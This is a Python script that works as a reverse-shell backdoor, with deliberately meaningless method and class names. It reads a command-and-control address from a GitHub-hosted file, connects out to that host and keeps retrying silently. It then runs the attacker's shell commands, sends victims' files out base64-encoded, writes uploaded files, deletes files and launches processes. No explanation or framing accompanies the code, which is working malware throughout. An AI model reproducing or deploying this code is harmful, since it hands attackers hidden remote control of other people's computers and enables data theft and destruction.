import subprocess, socket, json, os, base64, time, urllib.request,sys

class dtf2un:
    
    def __init__(self,ip,port):
        self.sp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sp.connect((ip,port))
        
    def _374egv(self,data):
        json_data = json.dumps(data)
        self.sp.send(json_data.encode())

    def my779f(self):
        data = "".encode()
        while True:
            try:
                data = data + self.sp.recv(4096)
                return json.loads(data)
            except ValueError:
                continue
            except Exception as E:
                #print(str(E))
                break
            
    def _5zxun5(self,command):
        try: 
            return subprocess.check_output(command, shell=True)
        except Exception as e:
            return "[-] Command Error\n" + str(e)
        
    def fz2v9t(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory To "+path

    def qzwu9g(self,path):
        with open(path,"rb") as f:
            return base64.b64encode(f.read()).decode()

    def _73mvhb(self,path,content):
        with open(path,"wb") as f:
            f.write(base64.decodebytes(content))
            return "[+] Upload Successful"

    def x98skil(self,file):
        os.remove(file)
        return "[+] Successfully Removed "+file

    def run(self):
        while True:
            command = self.my779f()
            
            if len(command) != 0:
                try:
                    if command[0].lower() == "exit":
                        self.sp.close()
                        break
                    elif command[0] == "cd" and len(command) > 1:
                        result = self.fz2v9t(" ".join(command[1:]))
                    elif command[0] == "download":
                        result = self.qzwu9g(" ".join(command[1:]))
                    elif command[0] == "upload":
                        result = self._73mvhb(command[1], command[2].encode())
                    elif command[0] == "delete":
                        result = self.x98skil(" ".join(command[1:]))
                    elif command[0] == "execute":
                        subprocess.Popen(" ".join(command[1:]),shell=True)
                        result = "[+] Executed "+" ".join(command[1:])+"!"     
                    else:
                        result = self._5zxun5(command).decode()   
                except Exception as e:
                    result = "[-] Error Processing\n" + str(e)
                    #print(result)
                self._374egv(result)
                    
            else:
                self._374egv("Enter a command")
        self.sp.close()

while True:
    try:
        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/powershell/raw/main/viper/requestContent").read())
        if "fine" in [i.lower() for i in data.keys()]:
            addr = list(data.values())[0]
        else:
            raise Exception
        attack = dtf2un(addr[0],addr[1])
        attack.run()
    except Exception as e:
        #print(str(e))
        time.sleep(10)
        continue
